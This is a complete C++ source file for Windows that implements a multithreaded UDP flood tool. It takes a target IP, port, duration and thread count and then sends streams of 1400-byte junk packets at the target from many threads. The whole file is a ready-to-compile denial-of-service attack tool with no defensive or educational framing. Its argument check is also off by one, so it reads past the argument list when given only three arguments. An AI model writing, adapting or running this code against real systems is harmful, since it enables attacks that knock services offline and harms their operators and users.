#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>
#include <string>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

void flood(const std::string& ip, int port, int duration_sec) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;

    sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    char payload[1400];
    memset(payload, 'A', sizeof(payload));

    ULONGLONG end_time = GetTickCount64() + (duration_sec * 1000);

    while (GetTickCount64() < end_time) {
        for (int i = 0; i < 500; i++) {
            sendto(sock, payload, sizeof(payload), 0, (sockaddr*)&target, sizeof(target));
        }
    }

    closesocket(sock);
    WSACleanup();
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cout << "Usage: " << argv[0] << " <ip> <port> <duration_sec> <threads>\n";
        return 1;
    }

    std::string ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; i++) {
        threads.push_back(std::thread(flood, ip, port, duration));
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "Done.\n";
    return 0;
}